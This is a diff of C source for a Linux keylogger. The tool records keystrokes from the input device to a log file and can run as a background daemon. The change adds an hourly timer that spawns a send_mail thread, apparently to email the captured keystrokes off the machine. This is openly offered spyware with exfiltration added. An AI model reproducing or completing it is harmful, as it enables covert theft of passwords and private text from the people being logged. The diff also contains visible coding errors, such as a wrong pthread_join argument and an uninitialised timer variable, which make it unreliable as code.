@@ -9,29 +9,34 @@
 #include <fcntl.h>
 #include <getopt.h>
 #include <linux/input.h>
+#include <pthread.h>
 #include <stdbool.h>
 #include <sys/types.h>
 #include <time.h>
 #include "get_event_keyboard.h"
 #include "change_task.h"
 #include "table_key.h"
+#include "clock.h"
+#include "mail.h"
 
-
-int main(int argc, char *argv[])
+int main(int argc, char **argv)
 {
 	struct input_event ev;
 	char choose;
 	int option_index;
+	int get_stream_key;
 	bool daemon_mod = false;
 	bool caps_pressed = false;
 	bool shift_pressed = false;
+	int re_send= -1;
     int readable = 1;
 	char stream_path[128];
-	int get_stream_key;
+	char timestring[80];
+	pthread_t pth1;
 	char *log_file;
 	FILE *log;
 
-	log_file = "/var/log/Mkey_logger.log";
+	log_file = "/var/log/MDkey_logger.log";
 	log = stdout;
 
 	static struct option long_options[] = {
@@ -101,14 +106,11 @@ int main(int argc, char *argv[])
         change_task_to_background();
 	}
 
-
-
-    time_t rawtime;
-    char timestring[80];
-    time( &rawtime );
-    strftime(timestring,80,"%Y-%m-%d %H:%M:%S", localtime( &rawtime ));
-
+    log_time_now(timestring);
     fprintf(log, "\n Starting keylogger: %s\n", timestring);
+    bzero(timestring,80);
+    clock_t start, end;
+    start = clock();
 
 	while (readable > 0)
 	{
@@ -148,18 +150,39 @@ int main(int argc, char *argv[])
 				{
 					fprintf(log, "%s", scancode_to_ascii[ev.code]);
 			     	fflush(log);
+
 				}
 
 			}
-		else if(ev.value == 0) // Released a key
+	 	   else if(ev.value == 0) // Released a key
             {
 				  if(ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
                     {
                         shift_pressed = false;
                     }
             }
-		}
+		 if((((int) (end - start)) / CLOCKS_PER_SEC) >= 3600)//send mail every one hour
+		    {
 
+               log_time_now(timestring);
+
+               fprintf(log, "\n Time: %s\n", timestring);
+
+			   fflush(log);
+
+			   start = clock();
+
+               bzero(timestring,80);
+
+			   re_send = pthread_create(&pth1, NULL, &send_mail, NULL);
+
+               }
+
+              end = clock();
+	}
+		     
+		
+    pthread_join( &pth1, NULL);
 	fclose(log);
 	close(get_stream_key);
 
